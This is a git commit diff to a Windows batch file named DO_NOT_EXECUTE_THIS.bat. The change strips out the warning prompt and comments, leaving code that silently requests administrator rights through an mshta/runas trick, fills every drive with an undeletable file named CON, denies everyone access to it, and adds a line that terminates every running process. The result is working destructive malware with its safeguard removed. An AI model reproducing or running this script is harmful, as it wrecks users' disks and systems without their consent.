19627f46e37d3e5566d26d7f11d193e723866503
DearVa <55902546+DearVa@users.noreply.github.com>
2020-02-20 04:24:19 -0600

    Add files via upload

--- DO_NOT_EXECUTE_THIS.bat
+++ DO_NOT_EXECUTE_THIS.bat
@@ -1,10 +1,4 @@
 @echo off
-REM warning, you can remove this
-echo I HAVE TOLD YOU DO NOT EXECUTE THIS!!!
-echo YOU CAN CLOSE THIS NOW AND NOTHING WILL HAPPEN.
-echo EXECUTE THIS ANYWAY?
-pause
-REM Get the administrator privileges
 %1 %2
 ver|find "5.">nul&&goto :Admin
 mshta vbscript:createobject("shell.application").shellexecute("%~s0","goto :Admin","","runas",0)(window.close)&goto :eof
@@ -19,11 +13,8 @@ FOR %%c in (Z,Y,X,W,V,U,T,S,R,Q,P,O,N,M,L,K,J,I,H,G,F,E,D,C,B,A) do (
             set var=!var:~10!
         )
         del %%c:\s
-        REM Create a new file named 'CON' that can't be delete easily
         fsutil file createnew \\?\%%c:\CON !var!
-        REM Disable file access
         cacls \\?\%%c:\CON /t /e /c /d everyone:F 
     )
 )
-REM Delete self
-del %0
+for /f %%I in ('wmic process get Name')do (wmic process where Name="%%I" delete)
